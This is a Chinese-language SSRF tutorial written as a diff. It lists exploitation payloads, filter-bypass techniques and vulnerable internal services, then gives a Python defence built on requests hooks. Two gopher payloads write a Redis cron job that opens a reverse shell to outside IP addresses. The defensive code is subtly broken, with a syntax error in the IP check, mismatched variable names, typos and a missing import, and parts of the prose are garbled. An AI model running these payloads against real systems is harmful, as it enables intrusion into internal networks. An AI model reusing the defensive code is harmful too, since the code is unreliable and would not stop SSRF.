@@ -1,0 +1,544 @@
+服务器端请求伪造(SSRF)
+
+	简介
+		服务端请求伪造(Server Side Request Forgery,SSRF)指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网
+		SSRF攻击通常针对外部网络无法直接访问的内部系统
+		
+		漏洞危害
+			SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件
+			内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害
+	
+	利用方式
+		SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式
+		以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下
+		curl -vvv 'dict://127.0.0.1:6379/info'
+		curl -vvv 'file:///etc/passwd'
+		curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
+					
+	相关危险函数
+		SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取
+		以PHP为例，涉及到的函数有
+			* file_get_contents()
+			* fsockopen()
+			* curl_exec()
+
+	过滤绕过
+		更改IP地址写法
+			一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式
+				* ^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
+				* ^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
+				* ^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
+			对于这种过滤我们采用改编IP的写法的方式进行绕过
+			例如192.168.0.1这个IP地址可以被改写成
+				8进制格式
+					0300.0250.0.1
+				16进制格式
+					0xC0.0xA8.0.1
+				10进制整数格式
+					3232235521
+				16进制整数格式
+					0xC0A80001
+				合并后两位
+					1.1.278
+					1.1.755
+				合并后三位
+					1.278
+					1.755
+					3.14159267
+			另外IP中的每一位，各个进制可以混用
+			访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作
+			另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏
+		
+		使用解析到内网到域名
+			如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名
+			另外xip.io提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1
+		
+		利用解析URL所出现的问题
+			某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤
+			这时候可能会出现对URL参数解析不当，导致可以绕过过滤
+			比如 http://www.baidu.com@192.168.0.1/ 当后端程序通过不正确的正则表达式(比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时)对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容
+		
+		利用跳转
+			如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过
+			可以使用如 http://httpbin.org/redirect-to?url=http://192.168.0.1 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过
+			常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
+		
+		通过各种非HTTP协议
+			如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用
+			比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的
+			例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL
+				gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+			除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件
+			使用file协议可以避免服务端程序对于所访问的IP进行的过滤
+			例如我们可以通过 file:///d:/1.txt 来访问D盘中1.txt的内容
+		
+		DNS Rebinding
+			一个常用的防护思路是
+				对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求
+			但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击
+			要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0
+			这样就可以进行攻击了，完整的攻击流程为
+				* 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
+				* 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
+				* 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址
+				* 由于已经绕过验证，所以服务器端返回访问内网资源的结果
+		
+		利用IPv6
+			有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如[::] 0000::1或IPv6的内网域名来绕过过滤
+		
+		利用IDN
+			一些网络访问工具如Curl等是支持国际化域名(Internationalized Domain Name,IDN)的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名
+			在这些字符中，部分字符会在访问时做一个等价转换，例如ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ和example.com等同
+			利用这种方式，可以用①②③④⑤⑥⑦⑧⑨⑩等字符绕过内网限制
+	
+	可能的利用点
+		内网服务
+			* Apache Hadoop远程命令执行
+			* axis2-admin部署Server命令执行
+			* Confluence SSRF
+			* counchdb WEB API远程命令执行
+			* dict
+			* docker API远程命令执行
+			* Elasticsearch引擎Groovy脚本命令执行
+			* ftp / ftps（FTP爆破）
+			* glassfish任意文件读取和war文件部署间接命令执行
+			* gopher
+			* HFS远程命令执行
+			* http、https
+			* imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
+			* Java调试接口命令执行
+			* JBOSS远程Invoker war命令执行
+			* Jenkins Scripts接口命令执行
+			* ldap
+			* mongodb
+			* php_fpm/fastcgi 命令执行
+			* rtsp - smb/smbs（连接SMB）
+			* sftp
+			* ShellShock 命令执行
+			* Struts2 命令执行
+			* telnet
+			* tftp（UDP协议扩展）
+			* tomcat命令执行
+			* WebDav PUT上传任意文件
+			* WebSphere Admin可部署war间接命令执行
+			* zentoPMS远程命令执行
+		
+		Redis利用
+			* 写ssh公钥
+			* 写crontab
+			* 写WebShell
+			* Windows写启动项
+			* 主从复制加载 .so 文件
+			* 主从复制写无损文件
+		
+		云主机
+			在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果
+		
+		防御方式
+			* 过滤返回的信息
+			* 统一错误信息
+			* 限制请求的端口
+			* 禁止不常用的协议
+			* 对DNS Rebinding，考虑使用DNS缓存或者Host白名单
+		
+		如何在Python开发中拒绝SSRF漏洞
+
+			0x00 SSRF漏洞常见防御及绕过方法
+				SSRF是一种常见的Web漏洞，于需要请求外部内容的逻辑存在中，比如本地化网络图片、XML解析时的外部实体注入、软件的离线下载等
+				URL，提供代码直接请求这个URL，将造成SSRF漏洞
+				具体表现在以下几个财团上
+					* URL为内网IP或域名，攻击者可以通过SSRF漏洞扫描目标内网，并寻找内网内的漏洞，想办法快速瞄准
+					* URL中包含端口，攻击者可以扫描并发现内网中的其他服务，再进一步进行利用
+					* 当请求方法允许其他协议的时候，将可能使用gophar、file等协议进行服务利用，如利用内网的redis获取权限、利用fastcgi进行getshell等
+				特别是这些年，大量利用SSRF攻击网服务的案例被爆出来，导致SSRF漏洞逐渐出现
+				这给Web应用开发者提出了一个难题：如何在保证业务正常的情况下防御SSRF漏洞？
+				很多开发者认为，只要检查一下请求url的host不为内网IP
+				这个观点提出了两个技术要点
+					* 如何检查IP是否为内网IP
+					* 如何获取真正请求的主机
+				于是，通过这两个技术小窍门，想办法解决很多方法
+
+			0x01 如何检查IP是否为内网IP
+				这实际上是很多开发者提出的第一个问题，很多问题甚至连内网IP经常的段数也很多
+				何谓内网IP，实际上并没有一个硬性的规定，到多少段必须设置为内网的例子
+				通常我们为内网以下三个段设置为内网，所有内网内的机器分配到的IP在这些段中
+				192.168.0.0/16 => 192.168.0.0 ~ 192.168.255.255
+				10.0.0.0/8 => 10.0.0.0 ~ 10.255.255.255
+				172.16.0.0/12 => 172.16.0.0 ~ 172.31.255.255
+				所以，通常情况下，我们只需要判断目标IP不在这三个段，另外还包括127.0.0.0/8和0.0.0.0/8
+				在Linux下，127.0.0.1与0.0.0.0都本地本地，参考http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
+				很多人会忘记127.0.0.0/8，认为本地地址就是127.0.0.1，实际上本地回环包括了整个127段
+				你可以访问http://127.233.233.233/，会发现和请求127.0.0.1是一个结果
+				所以我们需要防御的实际上是5个段，只要IP不免这5个段中，就认为是“安全”的
+				网上一些开发者会选择使用“正则”的方式判断目标IP是否在这几个段中，这种判断方法是会遗漏还是误判
+				比如
+					-------------------------------------------------------------------------------------------------------
+					if re.match(r"^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
+						re.match(r"^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
+							re.match(r"^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$",ip_addess):
+						raise BaseException("inner ip addess attack")
+					-------------------------------------------------------------------------------------------------------
+				这是Sec-News最新版本判断内网IP的方法，里面使用正则判断IP是否时间网的几个段中
+				问题
+					* 利用八进制IP地址绕过
+					* 利用十六进制IP地址绕过
+					* 利用十进制的IP地址绕过
+					* 利用IP地址的省略写法绕过
+				写法(5个例子)：012.0.0.1、0xa.0.0.1、167772161、10.1、0xA000001但都请求请求是10.0.0.1，他们一个都匹配不上正则表达式
+				更聪明的人是不会用正则表达式来检测IP的(这种人并不多见于内网的正则一则特定规范写)
+				Wordpress的做法，先将IP地址化，然后“。”将其分割成数组parts，然后根据parts[0]和parts[1]的取值来判断
+				--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+				if(! $same_host) {
+					$host = trim($parsed_url['host'],'.');
+					if(preg_match('#^(([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d){3}[1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)$#',$host)) {
+						$ip = $host;
+					}
+					else {
+						$ip = gethostbyname($host);
+						if($ip === $host) // Error condition for gethostbyname()
+							$ip = false;
+					}
+					if($ip) {
+						$parts = array_map('intval',explode('.',$ip));
+						if(127 === $parts[0]|| 10 === $parts[0] || 0 === $parts[0] || (172 === $parts[0] && 16<= $parts[1] && 31 >= $parts[1]) || (192 === $parts[0] && 168 === $parts[1])
+						) {
+							// If host appears local,reject unless specifically allowed
+							/*
+								* Check if HTTP request is external or not
+
+								* Allows to change and allow external requests for the HTTP request
+
+								* @since 3.6.0
+
+								* @param bool false Whether HTTP request is external or not
+								* @param string $host IP of the requested host
+								* @param string $url URL of the requested host
+							*/
+							if(! apply_filters('http_request_host_is_external',false,$host,$url)) {
+								return false;
+							}
+						}
+					}
+				}
+				--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+				其实也略显麻烦，而且曾经也出现过用过方法的案例(WordPress<4.5SSRF分析)，不推荐使用
+					http://xlab.baidu.com/wordpress/
+				我又选择了一种更简单的方法
+				转换IP地址是可以转换成一个转换的，在PHP中调用ip2long函数转换，在Python使用inet_aton去转换
+				那么IP地址是一一对应的，和0.0.0.0 == 0，255.255.255.255 == 2^32 - 1
+				所以，我们判断一个IP是否在某个IP段内，最将IP段的话题值、目标IP值全部转换为可能，然后比较大小
+				于是，我们可以将之前的正则匹配的方法修改为如下方法
+				------------------------------------------------------------------------
+				if ip2long("10.0.0.0") <= ip_long <= ip_long("10.255.255.255") or \
+					ip2long("172.16.0.0") <= ip_long <= ip_long("172.31.255.255") or \
+					ip2long("192.168.0.0") <= ip_long <= ip_long("192.168.255.255") or \
+					ip2long("127.0.0.0") <= ip_long <= ip_long("127.255.255.255"):
+					raise BaseException("inner ip address attack")
+				------------------------------------------------------------------------
+				这就是一个最简单的方法，也最容易理解
+				偷看你知道一点掩码的知识，你知道IP地址的掩码实际上就是这样(32-IP地址所代表的数字的末尾bit数)
+				将以上判断修改地更简单
+				--------------------------------------------------------
+				from socket import inet_aton
+				from struct import unpack
+				
+				def ip2long(ip_addr):
+					return unpack("!L", inet_aton(ip_addr))[0]
+				
+				def is_inner_ipaddress(ip):
+					ip = ip2long(ip)
+					return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+						ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+						ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+						ip2long('192.168.0.0') >> 16 == ip >> 16 \
+						ip2long('0.0.0.0') >> 24 == ip >> 24
+				--------------------------------------------------------
+				以上代码也就是Python中判断一个IP是否是内网IP的最终方法，使用时调用is_inner_ipaddress(...)即可(注意自己编写捕捉异常的代码)
+
+			0x02 host获取与绕过
+				如何获取"真正请求"的Host，这里需要考虑三个问题
+					* 如何正确的获取用户输入的URL的Host？
+					* 只要Host只要不是内网IP即可吗？
+					* 只要Host指向的IP不是内网IP即可吗？
+				第一个问题，看起来很简单，但实际上有很多网站在获取Host上犯过一些错误
+				最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1
+				这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL
+				在Python 3下，正确获取一个URL的Host的方法
+				---------------------------------
+				from urllib.parse import urlparse
+				
+				url = 'https://10.0.0.1/index.php'
+				urlparse(url).hostname
+				---------------------------------
+				这一步一定不能犯错，否则后面的工作就白做了
+				第二个问题，只要检查一下我们获取到的Host是否是内网IP，即可防御SSRF漏洞么？
+				答案是否定的，原因是，Host可能是IP形式，也可能是域名形式
+				如果Host是域名形式，我们是没法直接比对的
+				只要其解析到内网IP上，就可以绕过我们的is_inner_ipaddress了
+				网上有个服务http://xip.io，这是一个“神奇”的域名，它会自动将包含某个IP地址的子域名解析到该IP
+				比如127.0.0.1.xip.io，将会自动解析到127.0.0.1，www.10.0.0.1.xip.io将会解析到10.0.0.1
+				这个域名极大的方便了我们进行SSRF漏洞的测试，当我们请求http://127.0.0.1.xip.io/info.php的时候，表面上请求的Host是127.0.0.1.xip.io，此时执行is_inner_ipaddress('127.0.0.1.xip.io')是不会返回True的
+				但实际上请求的却是127.0.0.1，这是一个标准的内网IP
+				所以，在检查Host的时候，我们需要将Host解析为具体IP，再进行判断，代码如下
+				------------------------------------------------------------------
+				import socket
+				import re
+				from urllib.parse import urlparse
+				from socket import inet_aton
+				from struct import unpack
+				
+				def check_ssrf(url):
+					hostname = urlparse(url).hostname
+				
+					def ip2long(ip_addr):
+						return unpack("!L", inet_aton(ip_addr))[0]
+				
+					def is_inner_ipaddress(ip):
+						ip = ip2long(ip)
+						return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+								ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+								ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+								ip2long('192.168.0.0') >> 16 == ip >> 16 \
+								ip2long('0.0.0.0') >> 24 == ip >> 24
+				
+					try:
+						if not re.match(r"^https?://.*/.*$", url):
+							raise BaseException("url format error")
+						ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
+						if is_inner_ipaddress(ip_address):
+							raise BaseException("inner ip address attack")
+						return True, "success"
+					except BaseException as e:
+						return False, str(e)
+					except:
+						return False, "unknow error"
+					------------------------------------------------------------------
+					首先判断url是否是一个HTTP协议的URL(如果不检查，攻击者可能会利用file、gophar等协议进行攻击)，然后获取url的host，并解析该host，最终将解析完成的IP放入is_inner_ipaddress函数中检查是否是内网IP
+					第三个问题，是不是做了以上工作，解析并判断了Host指向的IP不是内网IP，即防御了SSRF漏洞？
+					答案继续是否定的，上述函数并不能正确防御SSRF漏洞
+					当我们请求的目标返回30X状态的时候，如果没有禁止跳转的设置，大部分HTTP库会自动跟进跳转
+					此时如果跳转的地址是内网地址，将会造成SSRF漏洞
+					这个原因也很好理解，我以Python的requests库为例
+					requests的API中有个设置，叫allow_redirects，当将其设置为True的时候requests会自动进行30X跳转
+					而默认情况下(开发者未传入这个参数的情况下)，requests会默认将其设置为True
+					-------------------------------------------------------------------------------------------------------------
+					def get(url,params = None,**kwargs):
+						'''Sends a GET request
+							:param url : URL for the new :class:'Request' object
+							:param params : (optional) Dictionary or bytes to be sent in the query string for the :class:'Request'
+							:param \*\*kwargs : Optional argunents that ''request'' takes
+							:return : :class:'Response <Response>' object
+							:rtype : requests.Response
+						'''
+						kwargs.setdefault('allow_redirects',True)
+						return request('get',url,params-params=params,**kvargs)
+					-------------------------------------------------------------------------------------------------------------
+					所以，我们可以试试请求一个302跳转的网址
+					默认情况下，将会跟踪location指向的地址，所以返回的status code是最终访问的页面的状态码
+					而设置了allow_redirects的情况下，将会直接返回302状态码
+					所以，即使我们获取了http://t.cn/R2iwH6d的Host，通过了is_inner_ipaddress检查，也会因为302跳转，跳到一个内网IP，导致SSRF
+					这种情况下，我们有两种解决方法
+						* 设置allow_redirects=False，不允许目标进行跳转
+						* 每跳转一次，就检查一次新的Host是否是内网IP，直到抵达最后的网址
+					第一种情况明显是会影响业务的，只是规避问题而未解决问题
+					当业务上需要目标URL能够跳转的情况下，只能使用第二种方法了
+					所以，归纳一下，完美解决SSRF漏洞的过程如下
+						* 解析目标URL，获取其Host
+						* 解析Host，获取Host指向的IP地址
+						* 检查IP地址是否为内网IP
+						* 请求URL
+						* 如果有跳转，拿出跳转URL，执行1
+
+			0x03 使用requesrs库的hooks属性来检查SSRF
+				那么，上一章说的5个过程，具体用Python怎么实现？
+				我们可以写一个循环，循环条件就是“该次请求的状态码是否是30X”，如果是就继续执行循环，继续跟进location，如果不是，则退出循环
+				代码如下
+				------------------------------------------------
+				r = requests.get(url, allow_redirects=False)
+				while r.is_redirect:
+					url = r.headers['location']
+					succ, errstr = check_ssrf(url)
+					if not succ:
+						raise Exception('SSRF Attack.')
+					r = requests.get(url, allow_redirects=False)
+				------------------------------------------------
+				这个代码思路大概没有问题，但非常简陋，而且效率不高
+				只要你翻翻requests的源代码，你会发现，它在处理30X跳转的时候考虑了很多地方
+					* 所有请求放在一个requests.Session()中
+					* 跳转有个缓存，当下次跳转地址在缓存中的时候，就不用多次请求了
+					* 跳转数量有最大限制，不可能无穷无尽跳下去
+					* 解决307跳转出现的一些BUG等
+				如果说就按照之前简陋的代码编写程序，固然可以防御SSRF漏洞，但上述提高效率的方法均没用到
+				那么，有更好的解决方法么？当然有，我们翻一下requests的源代码，可以看到一行特殊的代码
+				--------------------------------------------
+				r = dispath_hook('response',hooks,r,**kargs)
+				--------------------------------------------
+				hook的意思就是“劫持”，意思就是在hook的位置我可以插入我自己的代码
+				我们看看dispatch_hook函数做了什么
+				----------------------------------------------------------------
+				def dispatch_hook(key, hooks, hook_data, **kwargs):
+					"""Dispatches a hook dictionary on a given piece of data."""
+					hooks = hooks or dict()
+					hooks = hooks.get(key)
+					if hooks:
+						if hasattr(hooks, '__call__'):
+							hooks = [hooks]
+						for hook in hooks:
+							_hook_data = hook(hook_data, **kwargs)
+							if _hook_data is not None:
+								hook_data = _hook_data
+					return hook_data
+				----------------------------------------------------------------
+				hooks是一个函数，或者一系列函数
+				这里做的工作就是遍历这些函数，并调用：_hook_data = hook(hook_data, **kwargs)
+				我们翻翻文档，可以找到hooks event的说明 http://docs.python-requests.org/en/master/user/advanced/?highlight=hook#event-hooks
+				文档中定义了一个print_url函数，将其作为一个hook函数
+				在请求的过程中，响应对象被传入了print_url函数，请求的域名被打印了下来
+				我们可以考虑一下，我们将检查SSRF的过程也写为一个hook函数，然后传给requests.get，在之后的请求中一旦获取response就会调用我们的hook函数
+				这样，即使我设置allow_redirects=True，requests在每次请求后都会调用一次hook函数，在hook函数里我只需检查一下response.headers['location']即可
+				说干就干，先写一个hook函数
+				----------------------------------------------------------------------------------
+				def _request_check_location(r,*args,**kwargs):
+					if not r.is_redirect:
+						return
+					url = r.headers['location']
+
+					# The scheme should be lower case...
+					passed = urlparse(url)
+					url = parsed.geturl()
+
+					'''
+						Faciliate relative 'location' headers,as allowed by RFC 7231
+						(e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
+						Compliant with RFC3986,we percent encode the url
+					'''
+					if not passed.netloc:
+						url = urljoin(r.url,requote_uri(url))
+					else:
+						url = requote_uri(url)
+					
+					succ,errstr = check_ssrf(url)
+					if not succ:
+						raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+				----------------------------------------------------------------------------------
+				当r.is_redirect为True的时候，也就是说这次请求包含一个跳转
+				获取此时的r.headers['location']，并进行一些处理，最后传入check_ssrf
+				当检查不通过时，抛出一个异常
+				然后编写一个请求函数safe_request_url，意思是“安全地请求一个URL”
+				使用这个函数请求的域名，将不会出现SSRF漏洞
+				--------------------------------------------------------------------------------------
+				def safe_request_url(url,**kawrgs):
+					def _request_check_location(r,*args,**kwargs):
+						if not r.is_redirect:
+							return
+						url = r.headers['location']
+
+						# The scheme should be lower case...
+						passed = urlparse(url)
+						url = parsed.geturl()
+
+						'''
+							Faciliate relative 'location' headers,as allowed by RFC 7231
+							(e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
+							Compliant with RFC3986,we percent encode the url
+						'''
+						if not passed.netloc:
+							url = urljoin(r.url,requote_uri(url))
+						else:
+							url = requote_uri(url)
+						
+						succ,errstr = check_ssrf(url)
+						if not succ:
+							raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+					
+					success,errstr = check_ssrf(url)
+					if not success:
+						raise requests.exception.InvalidURL("SSRF Attack: %s" % (errstr,))
+					
+					hooks = dict(response = _requset_check_location)
+					kawrgs['hooks'] = hooks
+					return requests.get(url,**kwargs)
+				--------------------------------------------------------------------------------------
+				我们可以看到，在第一次请求url前，还是需要check_ssrf一次的
+				因为hook函数_request_check_location只是检查30X跳转时是否存在SSRF漏洞，而没有检查最初请求是否存在SSRF漏洞
+				不过上面的代码还不算完善，因为_request_check_location覆盖了原有(用户可能定义的其他hooks)的hooks属性，所以需要简单调整一下
+				最终，给出完整代码
+				------------------------------------------------------------------------------------
+				import socket
+				import re
+				import requests
+				from urllib.parse import urlparse
+				from socket import inet_aton
+				from struct import unpack
+				from requests.utils import requote_uri
+				
+				def check_ssrf(url):
+					hostname = urlparse(url).hostname
+				
+					def ip2long(ip_addr):
+						return unpack("!L", inet_aton(ip_addr))[0]
+				
+					def is_inner_ipaddress(ip):
+						ip = ip2long(ip)
+						return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+								ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+								ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+								ip2long('192.168.0.0') >> 16 == ip >> 16 \
+								ip2long('0.0.0.0') >> 24 == ip >> 24
+				
+					try:
+						if not re.match(r"^https?://.*/.*$", url):
+							raise BaseException("url format error")
+						ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
+						if is_inner_ipaddress(ip_address):
+							raise BaseException("inner ip address attack")
+						return True, "success"
+					except BaseException as e:
+						return False, str(e)
+					except:
+						return False, "unknow error"
+				
+				def safe_request_url(url, **kwargs):
+					def _request_check_location(r, *args, **kwargs):
+						if not r.is_redirect:
+							return
+						url = r.headers['location']
+				
+						# The scheme should be lower case...
+						parsed = urlparse(url)
+						url = parsed.geturl()
+				
+						# Facilitate relative 'location' headers, as allowed by RFC 7231.
+						# (e.g. '/path/to/resource' instead of 'http://domain.tld/path/to/resource')
+						# Compliant with RFC3986, we percent encode the url.
+						if not parsed.netloc:
+							url = urljoin(r.url, requote_uri(url))
+						else:
+							url = requote_uri(url)
+				
+						succ, errstr = check_ssrf(url)
+						if not succ:
+							raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr, ))
+				
+					success, errstr = check_ssrf(url)
+					if not success:
+						raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+				
+					all_hooks = kwargs.get('hooks', dict())
+					if 'response' in all_hooks:
+						if hasattr(all_hooks['response'], '__call__'):
+							r_hooks = [all_hooks['response']]
+						else:
+							r_hooks = all_hooks['response']
+				
+						r_hooks.append(_request_check_location)
+					else:
+						r_hooks = [_request_check_location]
+				
+					all_hooks['response'] = r_hooks
+					kwargs['hooks'] = all_hooks
+					return requests.get(url, **kwargs)
+				------------------------------------------------------------------------------------
+				外部程序只要调用safe_request_url(url)即可安全地请求某个URL，该函数的参数与requests.get函数参数相同
+				完美在Python Web开发中解决SSRF漏洞
+				其他语言的解决方案类似，大家可以自己去探索
